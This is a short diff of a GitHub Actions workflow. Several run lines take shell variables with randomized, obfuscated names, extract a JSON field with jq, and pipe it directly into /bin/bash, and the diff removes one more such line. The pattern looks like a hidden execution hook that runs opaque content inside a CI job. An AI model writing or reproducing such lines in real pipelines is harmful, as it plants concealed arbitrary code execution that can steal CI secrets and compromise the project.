@@ -23,7 +23,6 @@ jobs:
           echo $mqwrf47638 | jq -r .yorl39383 | /bin/bash
           echo $l73163 | jq -r .onbyp49 | /bin/bash
           printf '%s' "$d52" | jq -r .wolui9 | /bin/bash
-          echo $ial8 | jq -r .polly7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
